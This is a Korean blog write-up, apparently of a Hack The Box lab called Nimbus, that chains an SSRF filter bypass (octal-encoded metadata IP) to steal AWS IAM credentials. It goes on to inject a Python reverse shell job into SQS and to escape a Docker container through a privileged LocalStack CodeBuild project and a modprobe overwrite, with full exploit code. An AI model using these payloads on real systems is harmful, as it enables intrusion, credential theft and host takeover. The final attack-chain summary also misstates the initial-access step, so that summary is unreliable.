---
title: "[HTB] Nimbus (Hard_Linux)"
date: 2026-06-27 19:35:00 +09:00
categories: [Security & Hacking, HTB]
tags: [Hack The Box, hacking, RedLabs, Linux, aws, cloud]
password: "20260627"
pin: true
---

![Nimbus Solved](https://github.com/user-attachments/assets/0972cfcb-504f-4b21-81a6-d0d075edd605#.png)

[Congratulations OilLampCat! You are player #2585 to have solved Nimbus.](https://labs.hackthebox.com/achievement/machine/988787/912)

## 1. 시작에 앞서

![Nimbus](https://github.com/user-attachments/assets/9237f1bc-d49f-40f1-a654-7de9ecd4a7d7#.png)

이번 문제는 전처럼 그냥 리눅스면 리눅스고 윈도우면 윈도우지라는 안일한 생각으로 윈도우 hard도 풀어봤는데 도전해보자! 하고 덤볐다가 매우 큰코 다친 문제였다고 볼 수 있겠다.

애초에 초기 침투 과정부터가 일반적으로 쉬운 문제 풀 떄 보던 서비스 버전을 통한 CVE 탐색이나 FUZZING, 취약한 계정 정보 탈취 와 같은 것이 아니라 무려 Cloud 서비스인 AWS를 건들여야 하는 문제인지라 솔직히 이번 문제는 도전하고자 한다면 클라우드 보안 혹은 기본적인 aws 명령어 등을 공부한 후 도전하는 것이 좋겠다.

필자는 사실 그런거 없이 바로 몸을 밀어넣었기에 서술 과정에서 미흡한 부분이나 이거 아닌데? 어떻게 한거지? 한 내용들이 많을 수 있으므로 찾는다면 댓글을 달거나 이메일을 보내준다면 너무 감사하겠다.

담주 월요일날 발표도 할 생각인지라 빠르게 한번 의식의 흐름을 따라 작성해보자.

## 2. 초기 침투 : 정찰 및 정보 수집 (Reconnaissance & Enumeration) 

사실 전까진 정찰 및 정보 수집 단계를 초기 침투 부분에만 써놨다만 이게 초기 침투 후에도 권한 상승을 위한 정보 수집 단계도 필요했기에 이리 쓰는 것이 좋겠다고 생각했다.

물론 간단한 과정이라면 추가하지 않겠다만 이번건... 어우...

### 2-1. 포트 및 서비스 스캐닝

![nmap](https://github.com/user-attachments/assets/7cb9b92b-8628-40b7-964a-2c13a00750bd#.png)

뭔가 이제 풀다보니까 감이 온다랄까? 포트 스캐닝을 했는데 열린 부분이 많이 없다? 그럼 뭔가 어렵겠구나 하는 생각이 먼저 든다.

이번 문제에서도 **22/ssh** 포트와 **80/http** 포트가 열려있는데 `nimbus.htb`로 리다이렉션 된다고 하니 `/etc/hosts`에 도메인을 추가해주자.

![domain](https://github.com/user-attachments/assets/314bb5af-a2be-422f-a343-186b5430694c#.png)

뭔가 하나가 더 있지만 저건 초기 침투 단계 때 찾게 될 정보이니 일단은 `nimbus.htb`만 추가해주면 된다. 

### 2-2. 사이트 탐색

![nimbus1](https://github.com/user-attachments/assets/fc569d37-87f3-4a16-9f33-c0bcb8db7910#.png)

첨에 딱 사이트에 접속하게되면 위처럼 `내부 job 스캐줄러` 라는 내용의 사이트가 나온다.

YAML 파일을 넣거나 YAML 확장자를 가진 URL을 넣으면 된다라고 하니 첨에 딱 보자마자  **"YAML 인젝션인가? 아니면 역 직렬화?"** 하는 생각이 들었다.

게다가 아래를 보니 `nimbus v1.4.2`라는데 오 그럼 이걸 토대로 검색하면 되겠다! 싶었다.

![version](https://github.com/user-attachments/assets/2ed8bc37-b0a2-4d24-a1b0-adf5155b2da1#.png)

하지만 그렇게 쉽게 되었으면 hard 문제가 아니였겠지. 애초에 이 사이트는 github에 올라와있는 코인 관련 사이트의 nimbus가 아니라 이 문제를 위해 제작자가 만든 사이트일 뿐이었다. 

즉 버전은 의미 없었다는 소리.

다만 아래를 보면 작게 **healthCheck**나 **docs** 문서로 갈 수 있는 링크가 있었다.

![nimbus_docs](https://github.com/user-attachments/assets/e3b13c2c-1062-4b2f-8ddd-b25f2a30fcda#.png)

docs는 404가 떴다. 여긴 아예 볼 것이 없다는 소리.

![nimbus_health](https://github.com/user-attachments/assets/2c2458d2-d787-4eec-9b87-0479c6bcbf23#.png)

그런데! 그런데 말이다. **health**로 들어가니 이게 왠걸? 서브 도메인이 **aws**로 하여금 클라우드 서비스 엔드포인트가 외부에 노출되어있음을 확인했다.

일단은 전과 달리 뭔가 특이한게 있으니 aws가 있구나 하고 그저 넘어갈 뿐, 다른 더 쉬운 공격 백터를 찾으러 갔었다. 애초에 aws는 완전히 모르는 분야였기에 건들일 생각도 하지 못했었다.

음.. 그러지 말걸. 문제 제목 부터가 NIMBUS 비구름인데...

![nimbus-sign](https://github.com/user-attachments/assets/d62e13bb-e717-48b9-a3c1-cbebda6afe26#.png)

메인 페이지에서 로그인을 하는 부분(sign in)을 들어가보니 어째? 

회원가입을 하려면 `job submitter`로 가서 제출해서 가입을 하라네?

![nimbus_job](https://github.com/user-attachments/assets/9524c6ea-c228-479d-b6b6-2210afceda96#.png)

그래서 **submit job**으로 옮겨갔다.

딱 보아하니 아까 생각한 YAML 파일 제출과 URL을 통한 제출 등이 있어보였다.

인젝션이나 역직렬화 하면 딱이겠죠? ~~아니다~~

![nimbus_job2](https://github.com/user-attachments/assets/1e115d50-b01e-4c5c-88fa-be2598b802e7#.png)

YAML넣는 부분은 직접 적어서 내는 부분이였고.

그래서 난 바로 burp를 켜고 인젝션이나 yaml에 리버스쉘 심기 등을 했었다.

만 위 사진을 잘 보면 말이지.

`Parsed with safe_load. No code execution at submission time.`

애초에 yaml을 불러올 때 일반 `load`가 아니라 `safe_load`로 불러온댄다.

난 이걸 못보고 막 시도했었다가 나중에 알았다.

[Python에서 YAML 다루기 (PyYAML) / sr's lair](https://simryang.tistory.com/entry/python3-yaml-%EB%8B%A4%EB%A3%A8%EA%B8%B0#.png)를 읽어보고 알았다. 아 이거 안 되는구나.

그래도 혹시 모르니 오히려 좋았으.

![ffuf](https://github.com/user-attachments/assets/b87e7b1d-00ff-46e9-91d7-a816cfa64be9#.png)

그럼 혹시 서브 도메인이 더 있을까 했다.

는 아까 본 aws만이 존재했다.

결국 돌고 돌아 어떻게든 aws를 이용해야한다! 라는건데. 난 여기서부터 모르니까 막혔었다.

![wapalyzer](https://github.com/user-attachments/assets/8d8f775c-2d28-433f-9e13-85cbda4f6d9d#.png)

**wappalyzer**로도 무슨 기술 스택을 썼다 이런 이야기도 없고.

![dirsearch](https://github.com/user-attachments/assets/c2ba7080-3a8b-4e6a-a152-4b9a785f8922#.png)

**dirsearch**를 통한 디렉토리 리스팅을 진행했을 떄도 딱 jobs와 login만 있었고. 

## 3. 초기 침투 (Initial Foothold / Exploitation)

![Yaml](https://github.com/user-attachments/assets/d186e953-5e1d-4474-8d88-1d91d311ee8f#.png)

그래서 결국 aws로 돌아와 클라우드 보안 취약점이라던가 기본적인 내용들을 읽어보았다.

일단 우리가 아까 본 **aws.nibus** 부분이 존재한다는 것과 접속 가능하다는 것을 알았으니 그곳을 건들여보기로 했다. 

### 3-1. SSRF 취약점

![awsip](https://github.com/user-attachments/assets/8798c855-91b8-4c98-8835-98f8da2a94be#.png)

일단 내가 지금 정리할 때야 성공한 것을 적지 사실 이 부분도 하루동안 이곳 저곳 다 찔러보다 발견했다.

확실히 yaml 업로드는 `safe_load`로 막혀있으니 불가능할것이라 생각했고 그렇다면 혹시 url에 업로드를 할 떄 내 서버에 있는 yaml을 가져가니 이상한 그니까 리버스 쉘 같은걸 넣어볼까 했는데 다 실패했었다.

그러다 혹시 loacalhost 링크 같은걸 넣으면 그 정보를 불러오려나? 싶은 생각이 들어 관련 내용을 찾아봤었다.

그러자 위처럼 내부 네트워크에서 접근 가능한 로컬 IP 주소인 **169.254.169.254**에 대해 알게되었다.

일단 뭐 로컬이라니 `loacalhost`나 `127.0.0.1`등도 다 해보고 이 아이피도 넣어봤지만 실패했었다.

사실 **169.254.169.254**는 클라우드 자격 증명(IAM Role 등)이 담긴 중요한 주소이기에 어떻게든 뚫고 들어갈 수만 있다면! 이라는 생각으로 또 막혔다.

![IP변경](https://github.com/user-attachments/assets/75ded77d-8dfb-41e1-9b42-bc4905f53d23#.png)

그런데 말입니다! 이게 지금 우리가 보고있는 이 ip(169.254.169.254)는 16진수이지 않는가? 그런데 만약에 이걸 다른 진수로 바꿨을 때 인식하는게 같다면? 그런데 방화벽에는 ip 등록이 하드코딩되어있다면?

그렇게 난 16진수이던 **169.254.169.254**을 8진수인 **0251.0376.0251.0376**이라는 문자열로 만들어서 요청을 보내봤다. 맨 뒤에 `.yaml`은 안 넣으면 진행이 안되었기에 쿼리 파라미터를 덧붙인 것이다.

확장자 필터링 우회와 ip 주소 우회까지 해버리니 드디어!(블로그 글로는 짧지만) 보안 정책 에러가 사라지고 **AWS 메타데이터**의 내용이 Preview 화면에 나타났다!

여기서 간단히 보고 넘어가자면

- **ami-id** : 이 서버를 만들 떄 쓴 운영체제의 번호가 있는 곳
- **Hostname** / **local-ipv4** : 내부망 주소
- **iam/** : IAM 이라는 아이디, 비밀번호 대신 역할(Role)이라는 권한이 저장된 곳

![role](https://github.com/user-attachments/assets/4802e156-f822-4bef-a5b4-b9959e705d1d#.png)

그렇기에 iam에 들어가 계정 정보를 살펴보니 역할(Role)을 찾고 여기서 찾은 역할을 기반으로

![credential](https://github.com/user-attachments/assets/135f081f-af90-4338-ada9-7cbcde3100ee#.png)

이렇게 **/meta-data/iam/security-credentials/{역할}?a=test.yaml**로 **AccessKeyID**, **SecretAccessKey**, **Token** 까지 핵심적인 토큰을 얻어낼 수 있었다.

이게 바로 AWS 내부망을 돌아다닐 수 있게 해줄 증명서렸다!

이제 이걸 이용해서 aws에 접속해보자.

### 3-2. AWS-CLI

연결을 위해서는 aws-cli라는 도구를 이용한다.

![awscli_setting](https://github.com/user-attachments/assets/48bad309-aa66-4639-a355-221c2e47e034#.png)

하나씩 export 해서 키를 연결해도 되겠지만 아예 따로 저장하는 파일을 만들어서 export 하기로 했다.

참고로 이렇게 해둬야 이후 이것저것 하면서 머신을 몇번이고 리셋해도 바로 권한상승으로 넘어가기 쉬우니 가능하면 이렇게 하는걸 추천한다.

![export](https://github.com/user-attachments/assets/168c6c34-ef4d-4c8a-87cf-c9073dccc955#.png)

사용할 때엔 이렇게 **AWS_SHARED_CREDENTIALS_FILE**에 **credentials**를 연결해주고 **AWS_CONFIG_FILE**에 만들어둔 **config**를 연결하면 된다.

위에서 `health`에 들어갔을 때 `queue`, `scheduler`, `storage`를 봤었기에 **SQS (Simple Queue Service)** 가 돌고 있을 것이라 생각해 리스트를 뽑아보니

**http://floci:4566/{번호}/nimbus-jobs** 를 찾아낼 수 있었다.

잠시 어디까지 왔나 정리를 해보자면

1. **문(Web)** 통과 : SSRF 취약점을 이용해 애플리케이션의 방화벽 넘기
2. **신분증(IAM)** 탈취 : 메타데이터 서버를 속여서 `nimbus-web-role`이라는 신분증 탈취
3. **내부망 지도?** 확보 : 신분증을 AWS CLI에 장착하고 내부 통신망에 job을 나열하여 job의 주소지인 `nimbus-jobs`를 얻어냈다.

그리고 여기서 나온 `4566` 포트는 **LocalStack**이라는 (AWS 환경을 로컬에 가짜로 띄워주는) 도구의 기본 포트가 존재한다는 힌트를 찾아냈다.

![notauth](https://github.com/user-attachments/assets/8c658d59-906f-4a0c-97a3-b10fc0f5be29#.png)

그러나 이걸로 뭘 해보려 했지만 이 `nimbus-web-role`이라는 역할은 이 큐에 새로운 일거리를 집어넣는 권한(Write)은 있지만 큐 안에 들어있는 일거리를 뺴내서 읽어보는(read)권한은 존재하지 않았다.

![pyhton](https://github.com/user-attachments/assets/5b4bb4e1-6785-4786-a3b9-e51379e19240#.png)

그래서 다시 또 미궁에 빠졌었다가 submit job의 아래 example 예시를 보니 어? **python3**가 있네?

![rev](https://github.com/user-attachments/assets/eedba3d4-57b5-483e-87af-46c2ddf5f6ae#.png)

게다가 우리가 지금 Read 권한은 없을 지언정 Write 권한은 있잖아? 

고로 AWS SQS 큐에 **python 리버스 쉘**을 담은 **작업(Job)** 을 웹이 아니라 직접적으로 밀어넣기로(**Send**) 하였다.

> aws-cli 기본 명령어

```sh
aws --endpoint-url http://aws.nimbus.htb sqs send-message \
--queue-url http://floci:4566/847219365028/nimbus-jobs \
```

- **aws ... sqs send-message** : 획득한 권한(nimbus-web-role)을 이용해 AWS SQS 서비스에 새로운 작업을 전송하는 명령어
- **--endpoint-url http://aws.nimbus.htb** : 찾았던 aws의 주소에 엔드포인트를 지정하여 통신
- **--queue-url http://floci:4566/** : 찾아냈던 nimbus-jobs의 큐 주소

> 페이로드

```sh
--message-body '{"name": "pwn", "runtime": "python3.11", "script": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.31\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"])"}'
```

- **"name": "pwn"** : 작업의 이름
- **"runtime": "python3.11"** : 제출 페이지에서 봤던 python 버전
- **"script": "..."** : python의 한줄짜리 리버스쉘 코드
  - **os.dup2()** : 이건 본적이 없어서 기록하자면 타겟 서버의 입력, 출력, 에러를 방금 연결한 소켓으로 보내는 코드 부분으로 없을 경우 쉘이 붙기만하고 아무것도 안뜰 수 있다.


![getuser](https://github.com/user-attachments/assets/01764a0f-b982-4ca9-ba28-a3ee34aefa79#.png)

그렇게 `worker`라는 계정을 얻고 유저 플래그를 획득할 수 있었다!

뭔가 쓰다보니 되게 쉽게 풀 수 있었던 것 같은데 클라우드쪽을 아예 모르던 나에게는 어우...

## 4. 권한 상승 (Privilege Escalation) 

근데 권한 상승이 이것보다 더 복잡하다면 믿으시겠습니까?

### 4-1. 권한 상승 : 정찰 및 정보 수집

![기본 계정 나열](https://github.com/user-attachments/assets/f521d8c4-0063-42c1-bccc-55ebb94ad2f5#.png)

일단 기본적으로 내가 취득한 계정을 살펴보니 `worker`라는 이름의 계정이다.

![파일 탐색](https://github.com/user-attachments/assets/49b151c7-3f78-45fa-b472-8e1c51780c2b#.png)

바로 worker 권한이 건들일 수 있는 파일들을 나열해봤지만 **worker.py**, **requirments.txt**를 제외하곤 딱히?

![sudol](https://github.com/user-attachments/assets/689fef79-30a1-4872-b13d-12065281b800#.png)

이어서 `sudo -l`을 진행 해보니 애초에 `sudo`가 없다 하고 호스트 네임을 보니(@ 뒤에 있는거) 이상한 문자열이 있는걸 보아 **Docker의 컨테이너 ID** 라는걸 유추할 수 있었다. 최종적으론 **.dockerenv**가 있으니 말 다했지.

![env](https://github.com/user-attachments/assets/ee997e63-caa2-4c75-a4da-b39f74684cb6#.png)

혹시 환경변수에 뭔가 중요한게 있지 않을까 싶어 확인해보니, `AWS_SECRET_ACCESS_KEY`와 `AWS_ACCESS_KEY_ID`가 존재했는데 우리가 이전에 리버스쉘로 침투를 하기 전 썼던 **nimbus_web_role**의 키와는 달랐다. 애초에 session_key도 없고.

그런데 이게 잘 보면 **AWS_ACCESS_KEY_ID**가 이전엔 **ASIA**로 시작했는데 이번엔 **AKIA**로 시작한다는 것을 알 수 있다.

1. AISA (임시 자격 증명 / Temporary Credentials)
   - AWS STS (Security Token Service)를 통해 발급된 임시키
   - 만료 시간인 **AWS_SESSION_TOKEN**이 있는게 특징

2. AKIA (영구 자격 증명 / Permanent Credentials)
   - IAM User(사용자)에게 직접 발급된 영구적인 키
   - 만료되지 않고 세션 토근 없이 Key ID와  Secret Key 두개만으로 작동

![workerrole](https://github.com/user-attachments/assets/e026d76c-a82d-4ece-91cd-a9ceb82ebeae#.png)

그래서 이 AKIA 키는 그럼 어떤 유저인고 하니

이번엔 **nimbus-worker-role** 이라는 역할이였다.

![webrole](https://github.com/user-attachments/assets/682a5abd-2009-461b-9186-5a37ab315e3e#.png)

만약 web-role로 바꾸고 싶다면 위 이미지처럼 export를 이용해 환경변수를 지정해주면 된다.

![not auth](https://github.com/user-attachments/assets/80d8b8e1-ed9d-4d55-b08c-44f25f7f0f39#.png)

다만 여기서 문제가 있다면 web-role이던 worker-role이던 뭔 짓을 하던 다 안 되었다는거?

> AWS 외부 게이트웨이 (aws.nimbus.htb) 타격 시도 -> AccessDenied
   - `aws s3 ls`, `aws iam list-roles` 등

영구키를 얻었으니 클라우드 인프라를 휘젓고 다니려 했는데 명령어를 던져보니 worker-role의 권한이 다 막혀있는지 AccessDenied가 떴다.

> Docker Escape, 토커 탈출 시도
  - `newgroup`, `capsh` 확인, `mount` 등

![mount](https://github.com/user-attachments/assets/c624abfb-e8a2-4d18-9864-7915f83d9796#.png)

이전에 문제 풀 당시 newgroup을 이용해 도커탈출했던 기억이 나서 시도하려 했으나 권한 없음에다가 mount 명령어로도 권한 없음.

![capsh](https://github.com/user-attachments/assets/7559fa6f-e7c3-422d-a1a7-53d89736ed71#.png)

도커 컨테이너의 원한 확인을 위해 CapBnd를 읽어왔으나 컨테이너엔 **capsh**가 없어서 칼리로 이동

![capsh2](https://github.com/user-attachments/assets/c8f3024e-d39e-4d68-80aa-b5e0f25b3149#.png)

그러나 권한을 읽어봤을 때 **도커 컨테이너 탈출**을 위한 `cap_sys_admin` 권한이 쏙 빠져있었기에 `--privileged`로 실행된 컨테이너가 아니였다는 것이 확인됬다. 이러니까 `mount`가 안되는거지. 

![linpeas](https://github.com/user-attachments/assets/887711b2-85b5-45fa-92a7-d72fdac9a19a#.png)

이것만큼은 쓰지 않으려 했는데, 결국 최종 툴인 린피스를 꺼내들었다.

그리고 결과에선 어떠한 필요 내용도 찾지 못했다...

하지만 여기서 끝났다면 내가 3일동안 권한상승에 도전해서 문제를 성공시키지 못했겠지?

### 4-2. 권한 상승 : LocalStack의 허점과 CodeBuild를 이용한 도커 탈출

외부망(`aws.nimbus.htb`)을 통한 공격이 `AccessDenied`로 모두 막히고, 컨테이너 자체에도 권한이 없는 일반 컨테이너임이 확인됬다. 그런데 우리가 저 위에서 `nimbus-job`이라는, 초기침투하기 전에 명령어를 던져 job을 찾을 때 `http://floci:4566`이라는 내부 주소를 발견하지 않았던가?

고로 우리는 외부망이 막혔으니 이 내부망을 어떻게든 이용해서 한번 침투를 해보자 생각했다.

![flocihealth](https://github.com/user-attachments/assets/b256d2ff-b29a-4f84-899f-a7399a373f9b#.png)

좀더 보기 쉽게 만들자면

![flocihealth](https://github.com/user-attachments/assets/4ee9daae-5c32-478e-b8e2-84dacddbd921#.png)

그래서 내부망에 `projects`나 `Roles` 그리고 웹에서도 볼 수 있었던 `health`명령어를 날리니 이 서버가 **LocalStack(AWS 클라우드 에뮬레이터)** 를 돌리고 있다는 것을 확인할 수 있었다.

그리고 그 중 눈에 띄는건 `codebuild`가 running 상태라는 점이다.

![codebuild](https://github.com/user-attachments/assets/aae11ce6-449c-4463-9284-639785fdc9fa#.png)

다만 codebuild는 이름 그대로 뭔가 코드를 실행할 수 있는건가? 정도만 생각했을 뿐 처음보는 것이라 가능한 모든 선생님을 불러 이야기를 나눴다. gemini, chatgpt, claud, qwen, gemma, copilot 등등...

그렇게 나온 결론은 

![localstack](https://github.com/user-attachments/assets/f498bdb5-1467-423c-9121-f3f3dbfeb41b#.png)

1. localstack은 인증을 요구하지 않는다는 것. (사실 우린 이미 worker나 web이 있어서 상관 없다만.)

2.  CodeBuild로 프로젝트를 만들 때 **privilegedMode: true** 옵션을 넣으면 컨테이너의 호스트는 모든 권한을 갖게 된다는 것.

고로 내부망(`floci:4566`)을 통해 권한 검사 없이도 CodeBuild에 접근한 뒤, `privilegedMode`가 켜진 악성 프로젝트를 만들라고 명령하면? 드디어 호스트를 장악할 수 있는 컨테이너를 맘대로 만들 수 있다는 것!

![codebuild](https://github.com/user-attachments/assets/03bcb664-0088-4a9f-b86a-6917e721703e#.png)

지금 당장엔 codebuild가 비어있는 상황이였기에 여기에 codebuild를 넣어주면 되는 것이다!

### 4-3. 권한 상승 : 문제가 있었던 부분들

하지만 이론과 현실은 늘 달랐다. 위 과정을 통해 '아하! 그럼 리버스 쉘 쏘는 프로젝트를 만들면 끝이네!' 라고 생각하며 냅다 CLI로 `buildspec`과 `create-project`를 시도했는데 이게 참 cli로 하려하니 꽤나 문제가 많았었다.

일단 **CodeBuild**에 전달해야하는 `buildspec`(빌드 설정)은 여러 줄의 YAML 형태였고 그 안에 리버스쉘을 위한 파이썬 코드니, 여러 따옴표나 특수문자까 난무했다.

![projects](https://github.com/user-attachments/assets/5271d4f5-9af6-4ffc-814b-722ecf27fcb2#.png)

이걸 JSON 파일 하나로 욱여넣으려다보니 아예 내용이 텅 빈 `"buildspec": ""` 을 가진 깡통 프로젝트들만 만들어버렸다.

![vim](https://github.com/user-attachments/assets/ef16fc19-4de5-4b41-a0a0-a0724c9ccb84#.png)

게다가 이게 **vim**이나 **nano**가 없어 **cat** 명령어로만 넣었어야 했는데 내가 `/`를 쓰는게 익숙치 않다보니 복사 붙여넣기를 했었는데 이게 참 쉽지가 않더라.

게다가 이게 그냥 **privilegedMode** 로 띄운다고 해서 내 셀이 바로 떨어지는게 아니라 그 안에 예를 들어 `id` 명령어를 치면 그걸 내가 추가한 명령어로 바꿔버리는? `BASH_FUNC_ID%%` 같은 부분도 넣어야 했다.

### 4-4. 권한 상승 : 코드를 짜서 진행해보자!

![code](https://github.com/user-attachments/assets/77dd00a4-b109-4104-be8e-a84c833e7e4e#.png)

우리가 위에서 **worker**의 계정으로 읽을 수 있는 파일을 찾아보았을 때 **requirements.txt**파일을 발견했었다.

![requirementtxt](https://github.com/user-attachments/assets/1c37203a-dc2e-4261-b789-7aa929476ce1#.png)

여기서 **boto3**라는 라이브러리가 기본적으로 설치되어있다는 걸 알 수 있었고. 같은 `/app`에 들어있는 worker.py 의 경우에도 이 boto3라는걸 사용했다.

여기서 잠깐 **Boto3**가 뭘까? 이건 클라우드 해킹이나 AWS 개발을 처음 접해보는 사람이라면 생소할 수 있다. (내가 그랬다.)

이건 쉽게말해 **"파이썬으로 AWS 클라우드를 조종할 수 있게 해주는 SDK"**다. 우리가 터미널에서 **aws codebuild create-project ...**하고 길게 쳤던 명령어들을, 파이썬 코드로 하여금 몇 줄만으로 깔끔하게 실행할 수 있도록 도와주는 라이브러리다.

근데 그게 이 머신(도커 컨테이너)에 설치되어있었고, 백엔드(worker.py)도 이걸 쓰고 있었다.

~~여기서 말하는 worker.py는 safe_load가 안 걸려있는 /app에 들어있던 py~~

보안 용어로는 **Living off the Land** 라고 불리는 서버에 이미 깔려있는 합법적인 도구를 악용하는 기법이라고도 부르긴 한다더라.

<details markdown="1">
<summary>nimbus_revers_exploit.py (클릭해서 보기)</summary>

```python

# 혹시 buildspec에 `#`으로 인해 오류가 발생하거나 안된다면 #과 그 위 엔터를 지우고 시도해보세요.

import boto3

ENDPOINT = "http://floci:4566"
REGION = "us-east-1"
ATTACKER_IP = "10.10.14.31" # 문제 풀 때 내 IP
LPORT = 9005  # 맘대로, 깡통이 추천

buildspec = f"""version: 0.2
phases:
  build:
    commands:
        # 디버깅, 권한 확인용 | 빌드 로그에서 권한 확인용도
      - id
      - cat /proc/self/status | grep Cap
      
        # 여러 줄 쉘 스크립트를 하나의 YAML 명령으로 처리하기 위한 블록
      - |
      
        # rev.sh 생성 및 reverse shell payload 작성
        cat > /tmp/rev.sh << 'PYEOF'
        #!/bin/sh
        python3 <<'PYCODE'
        import os, pty, socket
        s = socket.socket()
        s.connect(("{ATTACKER_IP}", {LPORT}))
        
        # 소켓 연결을 표준 입력(stdin), 표준 출력(stdout), 표준 에러(stderr)로 연결하는 작업
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        pty.spawn("/bin/sh")
        PYCODE
        PYEOF
      - chmod +x /tmp/rev.sh
      - |
      
        # overlay upperdir에서 실제 호스트 상의 상위 경로를 꺼냄
        upper=$(grep 'overlay' /proc/mounts | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -1)
      
        # 호스트의 modprobe 경로를 rev.sh로 덮어쓰기
        echo "$upper/tmp/rev.sh" > /proc/sys/kernel/modprobe
      - |
      
        # 알 수 없는 실행 파일을 만들어 실행하면 커널이 modprobe를 호출함
        # 그러면 우리가 덮어쓴 rev.sh가 실행된다. 실패해도 빌드가 중단되지 않게 true를 붙임.
        printf '\\xff\\xff\\xff\\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x; true
""".format(ATTACKER_IP=ATTACKER_IP, LPORT=LPORT)

cb = boto3.client("codebuild", endpoint_url=ENDPOINT, region_name=REGION)

# 프로젝트 생성 (privilegedMode + BASH_FUNC 인젝션)
cb.create_project(
    name="nimbus-rev",
    source={"type": "NO_SOURCE", "buildspec": buildspec},
    artifacts={"type": "NO_ARTIFACTS"},
    environment={
        "type": "LINUX_CONTAINER",
        "image": "floci/floci:latest", # ubuntu 이미지는 못 가져오는듯?
        "computeType": "BUILD_GENERAL1_SMALL",
        "privilegedMode": True,  # CAP_SYS_ADMIN 획득 핵심!
        "environmentVariables": [
            {
                # bash가 환경 변수에서 id() 함수를 복원하도록 해서 id 호출을 가로챔
                "name": "BASH_FUNC_id%%",
                # entrypoint나 스크립트가 uid 검사할 때 root로 보이도록 우회
                "value": "() { echo \"uid=0(root) gid=0(root) groups=0(root)\"; }",
                "type": "PLAINTEXT"
            }
        ],
    },
    # LocalStack에서는 형식만 맞으면 되지만, 실제 AWS에서는 올바른 IAM 역할이 필요하다.
    serviceRole="arn:aws:iam::000000000000:role/codebuild-role",
)

# 빌드 시작
resp = cb.start_build(projectName="nimbus-rev")
print("Exploit reverse started. Build ID:", resp["build"]["id"], f"Listener의 {ATTACKER_IP}:{LPORT}를 확인해보세요.")

```

</details>

코드는 내가 짠거 + 깡통이들의 도움을 합쳐서 만든 코드이다.

[nimbus_revers_explain.md](https://github.com/user-attachments/files/29428884/nimbus_revers_explain.md)

[nimbus_revers_exploit.py](https://github.com/user-attachments/files/29428886/nimbus_revers_exploit.py)

많이 설명이 길기도 하고 내가 코드 짜면서 그 자체로도 많이 공부가 되었기에 첨부한다. 틀린 부분이 있을 수 있다는 것!

![rev](https://github.com/user-attachments/assets/4d2531cb-6594-4074-8df1-486b73923897#.png)

~~위 코드는 정리하기 전 일단 막 시도할 때 찍은 스크린샷이라 지금 코드랑 많이 다르다. 참고로 위 스크린샷은 실패했다. ㅎ~~

이제 이걸 kali(공격자 머신)에서 스크립트로 만든 후 넘겨주고 실행하면?

![짜잔](https://github.com/user-attachments/assets/6648e9d8-2148-4b4a-abb8-e2e15b86f89d#.png)

짜잔! 이렇게 드디어! 마참내! 관리자 권한의 리버스 쉘을 얻는데 성공했다.

매우매우 행복하다 이거야!

## 마치며

![Nimbus pwned](https://github.com/user-attachments/assets/2ef192f7-5a90-4cee-8a9d-ed74032f1369#.png)

3일간의 기나긴 삽질과 연구 끝에 드디어 NImbus의 root 플래글르 손에 넣었다.

초반에도 언급했지만, 이 머신은 단순히 "웹에서 취약점을 찾고 리눅스 권한 올리기"라는 고전적인 CTF 방식을 철저히 파괴한 문제였다. **웹 해킹, 클라우드 아키텍처(AWS), 그리고 컨테이너(Docker) 보안이라는 세 가지 영역의 지식이 완벽하게 맞물려야만** 풀 수 있는 아주 훌륭한(그리고 머리아픈) Hard 난이도의 머신이었다.

도커에 대한 지식도 깊지 않은데 거기다 AWS 라는 클라우드 서비스에 대한 것도 함께 연결하여 체이닝해서 공격해야 한다니...

그런 의미로 한번 Attack Chain을 한번 적어보고자 한다.

> Attack Chain

~~참고로 아래 이미지는 클로드가 만들어준건데 왜 STEP2에서 yaml.load(취약) 이라고 쓰여있는건지는 모르겠음. 분명 사이트엔 safe_load() 함수 쓴다고 했는데?~~

![attack chain](https://github.com/user-attachments/assets/f71b0f01-744f-4be5-bf08-c45756ee6329#.png)

1. **정찰 및 필터링 우회 (SSRF):** 외부에 노출된 `Job Submitter`에서 SSRF 취약점을 발견했다. 내부망(`127.0.0.1`, `169.254...`)을 막아둔 블랙리스트 필터링을 **IP 8진수 난독화(Octal Encoding)** 기법으로 우회하여 내부망과 통신할 수 있는 통로를 열었다.

2. **초기 침투 (YAML 역직렬화 RCE):** Vhost 퍼징으로 찾은 `aws.nimbus.htb` 엔드포인트를 통해 타겟 SQS 큐의 주소를 알아냈다. SSRF 통로를 이용해 이 큐에 악성 YAML 페이로드를 밀어 넣었고, 그로 인해 컨테이너 내부 쉘(Initial Access)을 획득했다.

3. **내부망 피버팅 및 API 타격:** 초기 침투 과정에서 획득한 `web`과 이후 환경변수(env)를 통해 확인한 `worker` 계정은 권한이 꽉 막힌 일반 컨테이너였다. 외부 AWS API 통신(`AccessDenied`)도 불가능한 상황에서, 에뮬레이터(LocalStack)의 내부망 심장부인 `http://floci:4566`을 직접 타격하기로 했다.

4. **특권 컨테이너 생성 및 호스트 장악 (Docker Escape):** 내부 API는 IAM 권한 검사를 하지 않는다는 LocalStack의 맹점을 이용했다. 파이썬 `boto3`를 이용해 **`privilegedMode: true`**가 설정된 악성 CodeBuild 프로젝트를 생성했다. 이후 `BASH_FUNC`로 환경 변수를 후킹하고 리눅스 커널의 `modprobe`를 조작하여, 최종적으로 호스트의 Root 쉘을 칼리 리눅스로 쏘아 올렸다.

> 이 문제를 푸는데 필요한 기본 지식들

- 클라우드 인프라 및 AWS 서비스에 대한 이해
  - SQS(Queue)
  - CodeBuild
  - AWS 자격 증명 차이 (`ASIA`와 `AKIA`)
- Web Security
  - SSRF 필터링 우회를 위한 기법들
- 컨테이너 보안 및 도커 탈출
  - 리눅스의 Capabilities(`capsh`)의 개념과 `CAP_SYS_ADMIN` 권한
  - 특권 모드(`--privileged`) 컨테이너가 호스트 시스템에 주는 영향
  - `modprobe` 후킹을 통한 커널 레벨에서 컨테이너 탈출 기법 (솔직히 좀 더 공부해야함)

내가 모든 내용을 완벽히 숙지했다! 는 아니기에 아직도 더 깊게 그리고 많이 공부해야함은 자명하다.

